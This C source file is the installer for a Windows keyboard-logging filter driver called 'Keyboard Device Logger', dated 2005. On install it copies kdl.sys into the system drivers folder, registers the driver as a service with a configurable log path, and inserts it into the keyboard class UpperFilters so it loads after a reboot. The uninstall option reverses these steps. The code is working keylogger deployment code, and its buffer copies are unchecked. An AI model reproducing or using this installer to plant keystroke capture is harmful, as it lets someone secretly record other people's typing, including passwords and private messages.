/*
 *   Keyboard Device Logger
 *   Copyright (C) 2005 Jason Todd
 *
 *   This program is free software; you can redistribute it and/or modify
 *   it under the terms of the GNU General Public License as published by
 *   the Free Software Foundation; either version 2 of the License, or
 *   (at your option) any later version.
 *
 *   This program is distributed in the hope that it will be useful,
 *   but WITHOUT ANY WARRANTY; without even the implied warranty of
 *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *   GNU General Public License for more details.
 *
 *   You should have received a copy of the GNU General Public License
 *   along with this program; if not, write to the Free Software
 *   Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 *
 *
 *   This basically is just a registry injector based HEAVILY on ctrl2cap so
 *   we can get the driver loaded.
 *
 *
 *   REFERENCE for this code :
 *    Ctrl2Cap 2.0 - http://www.sysinternals.com/
 *
 */

#include <windows.h>
#include <stdio.h>

// The name of our driver for registry entries
#define DRIVERNAME "kdl"
// Our drivers registry key entry
#define DRIVER_KEY  "System\\CurrentControlSet\\Services\\" DRIVERNAME
// GUID for class from DDK kbfiltr.inf
#define CLASS_KEY  "System\\CurrentControlSet\\Control\\Class\\{4D36E96B-E325-11CE-BFC1-08002BE10318}"
// Easy way to track file name changes on the driver file
#define SYSFILE DRIVERNAME ".sys"


// Default Settings
char SysPath[MAX_PATH] =  "\\SystemRoot\\" DRIVERNAME;
int  MaxList = 50;

/* 
 * =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= **
 *
 * Ripped and borrowed from (ctrl2cap.c) http://www.sysinternals.com/
 *
 * =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= **
 */
char *SearchMultiSz( char *Value, 
	                 DWORD ValueLength, 
	                 char *String )
{
DWORD  tmpLength;

	if ( ValueLength < strlen( String )) return NULL;

	tmpLength = ( DWORD ) ( ValueLength - strlen( String ) );
	do {

		if ( !stricmp( &Value[ tmpLength ], String ) &&
           ( !tmpLength || !Value[ tmpLength-1 ] ) ) 
		{   
         return &Value[ tmpLength ];
        }

	} while( tmpLength-- );

 return NULL;
}

/* 
 * =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= **
 *
 * Copy SYSFILE into the SystemDirectory, "\\drivers\\"  directory
 *
 * =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= **
 */
void CopySYSFile() {

char SystemDirectory[MAX_PATH];

  // Grab our system directory so we can place our sys in the /drivers dir
  GetSystemDirectory( SystemDirectory, MAX_PATH );
  // Concat on the drivers dir
  strcat( SystemDirectory, "\\drivers\\" );
  strcat( SystemDirectory, SYSFILE );

  // Attempt to move the driver into the systems driver directory
  if( !CopyFile( SYSFILE,          // File 
	             SystemDirectory,  // Destination
				 FALSE ) )         // Overwrite
  {
printf("Could not copy %s to %s\n",SYSFILE , SystemDirectory);
printf("Install ABORTED\n");
   exit(1);
  }

printf( "%s copied to %s\n",SYSFILE , SystemDirectory );
}

/* 
 * =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= **
 *
 * Delete SYSFILE into the SystemDirectory, "\\drivers\\"  directory
 *
 * =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= **
 */
void DeleteSYSFile() {

char SystemDirectory[MAX_PATH];

  // Grab our system directory so we can place our sys in the /drivers dir
  GetSystemDirectory( SystemDirectory, MAX_PATH );
  // Concat on the drivers dir
  strcat( SystemDirectory, "\\drivers\\" );
  strcat( SystemDirectory, SYSFILE );

  if ( !DeleteFile( SystemDirectory ) ) 
  {
printf("Error while trying to delete %s\n", SystemDirectory );
  }
  else
  {
printf("Deleted %s\n", SystemDirectory );
  }

}

/* 
 * =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= **
 *
 * Add any relavant key entries to the driver key
 *
 * =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= **
 */
void AddDriverRegKey( char SP[MAX_PATH],
                      int ML ) {

HKEY  HKey;
DWORD Value;

   if ( RegCreateKey( HKEY_LOCAL_MACHINE, DRIVER_KEY, &HKey ) != ERROR_SUCCESS )
   {
printf( "Error in RegCreateKey() HKEY_LOCAL_MACHINE\\%s\n",DRIVER_KEY );
printf("Install ABORTED\n");
    exit(1);
   }
        
printf( "Created RegKey HKEY_LOCAL_MACHINE\\%s\n",DRIVER_KEY );

    Value = 1;
    RegSetValueEx( HKey, 
		           "Type", 
				   0, 
				   REG_DWORD, 
				   (PCHAR) &Value, 
				   sizeof( Value ) );

printf( "Added Value in RegKey HKEY_LOCAL_MACHINE\\%s\\Type\n",DRIVER_KEY );

    Value = 1;
    RegSetValueEx( HKey, 
		           "ErrorControl", 
				   0, 
				   REG_DWORD, 
				   (PCHAR) &Value, 
				   sizeof( Value ) );

printf( "Added Value in RegKey HKEY_LOCAL_MACHINE\\%s\\ErrorControl\n",DRIVER_KEY );

    Value = 3;
    RegSetValueEx( HKey, 
		           "Start", 
				   0, 
				   REG_DWORD, 
				   (PCHAR) &Value, 
				   sizeof( Value ) );

printf( "Added Value in RegKey HKEY_LOCAL_MACHINE\\%s\\Start\n",DRIVER_KEY );


   // command line defined
    RegSetValueEx( HKey, 
		           "MaxList", 
				   0, 
				   REG_DWORD, 
				   (PCHAR) &ML, 
				   sizeof( ML) );

printf( "Added Value in RegKey HKEY_LOCAL_MACHINE\\%s\\MaxLimit\n",DRIVER_KEY );


   // command line defined
    RegSetValueEx( HKey, 
		           "Storage", 
				   0, 
				   REG_SZ, 
				   SP, 
				   strlen( SP )+1 );

printf( "Added Value in RegKey HKEY_LOCAL_MACHINE\\%s\\Storage%s\n", DRIVER_KEY, SysPath  );

    RegCloseKey( HKey );

printf( "Closed RegKey HKEY_LOCAL_MACHINE\\%s\n",DRIVER_KEY );


}
/* 
 * =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= **
 *
 * Remove the added keys in the driver key
 *
 * =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= **
 */
void RemoveDriverRegKey() {

long Error;

	Error = RegDeleteKey( HKEY_LOCAL_MACHINE, 
		                  DRIVER_KEY"\\Enum" );

	if ( Error != ERROR_SUCCESS )
	{
printf("Error Deleting RegKey %s\\Enum\n",DRIVER_KEY );
	}
	else
	{
printf("Deleted RegKey %s\\Enum\n",DRIVER_KEY );
	}

    Error = RegDeleteKey( HKEY_LOCAL_MACHINE, 
		                  DRIVER_KEY );

	if ( Error != ERROR_SUCCESS )
	{
printf("Error Deleting RegKey %s\\Enum\n",DRIVER_KEY );
	}
	else
	{
printf("Deleted RegKey %s\n",DRIVER_KEY );
	}

}

/* 
 * =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= **
 *
 *  Append driver entry to the UppFilter entry in the class
 *
 * =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= **
 */
void AppendClassRegKey() {

HKEY  HKey;
DWORD Length, Type;
char  UpperFilter[MAX_PATH];

   if ( RegOpenKey( HKEY_LOCAL_MACHINE, CLASS_KEY, &HKey ) != ERROR_SUCCESS )
   {
    printf( "Error in RegOpenKey() in HKEY_LOCAL_MACHINE\\%s\n",CLASS_KEY );
    exit(1);
   }

printf( "Opened RegKey HKEY_LOCAL_MACHINE\\%s\n",CLASS_KEY );

   Length = sizeof( UpperFilter );

   if ( RegQueryValueEx( HKey, "UpperFilters", 0, &Type, UpperFilter, &Length ) != ERROR_SUCCESS ) 
   {
    printf( "Error in RegQueryValueEx() in HKEY_LOCAL_MACHINE\\%s\n",CLASS_KEY );
    exit(1);
   }


   if( !SearchMultiSz( UpperFilter, Length, DRIVERNAME )) 
   {
    // Copy our driver into the UpperFilters key
    strcpy( &UpperFilter[Length-1], DRIVERNAME );
    Length = Length + ( DWORD ) strlen( DRIVERNAME );
    UpperFilter[ Length ] = 0;

    if ( RegSetValueEx( HKey, "UpperFilters", 0, Type, UpperFilter, Length + 1 ) != ERROR_SUCCESS ) 
    {
     printf("Error on RegSetValueEx() \n");
 	 exit(1);
    }

printf( "Added %s to HKEY_LOCAL_MACHINE\\%s\\UpperFilters\n",SYSFILE, CLASS_KEY );

   }
   else
   {
printf( "%s already PRESENT in HKEY_LOCAL_MACHINE\\%s\\UpperFilters\n",SYSFILE, CLASS_KEY );
   }

   RegCloseKey( HKey );

printf( "Closed RegKey HKEY_LOCAL_MACHINE\\%s\n", CLASS_KEY );
}

/* 
 * =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= **
 *
 *
 * =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= **
 */
void RemoveClassRegKeyEntry() {

HKEY  HKey;
DWORD Length, Type;
char  UpperFilter[MAX_PATH], *ptr;

   if ( RegOpenKey( HKEY_LOCAL_MACHINE, CLASS_KEY, &HKey ) != ERROR_SUCCESS )
   {
printf( "Error in RegOpenKey() in HKEY_LOCAL_MACHINE\\%s\n",CLASS_KEY );
    exit(1);
   }

   Length = sizeof( UpperFilter );

   if ( RegQueryValueEx( HKey, "UpperFilters", 0, &Type, UpperFilter, &Length ) != ERROR_SUCCESS ) 
   {
printf( "Error in RegQueryValueEx() in HKEY_LOCAL_MACHINE\\%s\n",CLASS_KEY );
    exit(1);
   }

   if ( ptr = SearchMultiSz( UpperFilter, Length, DRIVERNAME ) ) 
   {
     memcpy( ptr, ptr + strlen( DRIVERNAME ) +1, Length - (ptr-UpperFilter) - strlen( DRIVERNAME ) -1 );

	 Length -= (DWORD) strlen( DRIVERNAME ) +1;

	 if ( RegSetValueEx( HKey, "UpperFilters", 0, Type, UpperFilter, Length ) != ERROR_SUCCESS ) 
	 {
printf( "Count not remove %s in HKEY_LOCAL_MACHINE\\%s\\UpperFilters\n",SYSFILE, CLASS_KEY );	
	 }
	 else
	 {
printf( "Removed %s in HKEY_LOCAL_MACHINE\\%s\\UpperFilters\n",SYSFILE, CLASS_KEY );	
	 }
   }
   else
   {
printf( "Count not locate %s in HKEY_LOCAL_MACHINE\\%s\\UpperFilters\n",SYSFILE, CLASS_KEY );
   }

}

/* 
 * =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= **
 *
 *
 * =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= **
 */
void ShowError() {



}

/* 
 * =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= **
 *
 *
 * =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= **
 */
void ShowOptions() 
{

printf("kdl command line arguments\n\n");
printf("-i Installs %s driver\n",SYSFILE );
printf("-u UnInstalls %s driver\n",SYSFILE );
printf("-maxlist <#>\nDefault setting = %d\n", MaxList );
printf("-log <\\??\\>\nDefault setting = %s\n\n",SysPath );
printf("Example: kdl -i\n");

exit(1);

}
/* 
 * =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= **
 *
 *
 * =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= **
 */
void ShowBanner()
{

printf("Keyboard Device Logger, Copyright (C) Jason Todd 2005\n");
printf("Keyboard Device Logger comes with ABSOLUTELY NO WARRANTY\n\n");
printf("ERROR CHECKING IS AT A MINIMUM - THIS LOADER IS FRAGILE AT BEST WITH\n");
printf("-maxlist and -log OPTIONS. MAKE SURE YOU UNDERSTAND THEM AND USE THEM CORRECTLY OR BAD THINGS WILL RESULT.\n");
printf("kdl -i for install and kdl -u for uninstall are safe and RECOMENDED\n");
printf("Win2k/XP/2003 ONLY. KDL is still under development\n\n"); 

}

/* 
 * =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= **
 *
 * This is a very sloopy loader with almost ZERO error checking, its purpose is just
 * to get the job done. main could use ALOT of tweaking and clean up
 *
 * =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= **
 */
void main( int argc, char *argv[] ) 
{

int  i;
int  opt = 0;

  
  ShowBanner();

  // Show options if we have in invalid argument count
  if ( ( argc == 1 ) || ( argc > 6 ) )
  {
   ShowOptions();
  }

  // Loop through the command line args
  for ( i=1; i<argc; i++ )
  {

   if (stricmp( argv[i], "-i" ) == 0 )
   {
    if ( opt != 0)
	{
printf("Install/UnInstall are mutally exclusive\n");
     exit(1);
	}
	else
		opt = 1;
   }
   else if ( stricmp( argv[i], "-u" ) == 0 )
   {
    if ( opt != 0)
	{
printf("Install/UnInstall are mutally exclusive\n");
     exit(1);
	}
	else
        opt = 2;
   }
   else if ( stricmp( argv[i], "-log" ) == 0 )
   {
    i++;
	memset ( SysPath, 0 , MAX_PATH );
    memcpy( SysPath, argv[i], sizeof( char )*strlen(argv[i]) );
   }
   else if ( stricmp( argv[i], "-maxlist" ) == 0 )
   {
    i++;
	printf("Setting MaxList = %s\n",argv[i]);
    MaxList = atol(argv[i]);
   }
   else
   {
    ShowOptions();
   }

  }

  switch ( opt )
  {
  case 1 :
	  {
       // Copy SYSFILE into the System Directory\drivers
       CopySYSFile();
       // Add Driver info to the Registry
       AddDriverRegKey( SysPath,MaxList );
       // Append keys for the driver
       AppendClassRegKey();

	   break;
	  }
  case 2 :
	  {
       // Delete SYSFILE into the System Directory\drivers
       DeleteSYSFile();
       // Remove Driver info to the Registry
       RemoveDriverRegKey();
       // Remove Entry from the class entry
       RemoveClassRegKeyEntry();

	   break;
	  }
  default :
	  {
printf("Unknown error\n");
       exit(1);
	   break;
	  }
  }


printf("\n******** YOU MUST REBOOT THE SYSTEM FOR THE CHANGES TO TAKE AFFECT ********\n");


}
